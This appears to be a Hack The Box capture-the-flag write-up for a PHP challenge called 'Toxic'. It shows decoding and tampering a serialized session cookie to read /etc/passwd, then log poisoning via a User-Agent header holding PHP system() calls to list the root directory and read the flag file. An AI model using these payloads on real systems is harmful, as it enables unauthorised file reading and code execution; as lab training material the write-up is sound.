# Toxic

webpage interface:
![image](https://github.com/IcariZ/HTB/assets/89731969/fb1baa77-12f5-4447-985f-80a3c75cc6da)

no input bar is given in the web.

looking at the source code under index.php we see that the web actually has a cookie in it. 

analyzing the flow of the code, the cookie is being serialized and encoded with base64 when the cookie is empty

but when it's not, it decodes with base64 and unserialized itself

so it is insecure deserialization where user can interact/tamper directly with the serialization

let's [decode](https://gchq.github.io/CyberChef/) the cookie from the web
``PHPSESSID:"Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9"`` 
we got -> ``O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}``

let's try to access ``/etc/passwd`` by tweaking the cookie to 
``O:9:"PageModel":1:{s:4:"file";s:11:"/etc/passwd";}``

we get 
![image](https://github.com/IcariZ/HTB/assets/89731969/d6d3c475-cab0-42d5-a1ac-c8c7f10b8b15)

we can use log file poisoning to yield what is inside the machine with:
changing the user-agent from the header request with ``<?php system('ls /')?>``

![image](https://github.com/IcariZ/HTB/assets/89731969/b6429eb9-0bb4-4d2f-92e2-a5fa123cb5b7)

we get as a respond
![image](https://github.com/IcariZ/HTB/assets/89731969/69636579-2451-439f-8120-0ad5a82c81c1)

finally we know what file should we access 
change the user header into ``<?php system('cat /flag_vQTe7')?>`` and send the request again

![image](https://github.com/IcariZ/HTB/assets/89731969/1310a6d2-3293-4af6-ad0b-064b5e105fe7)



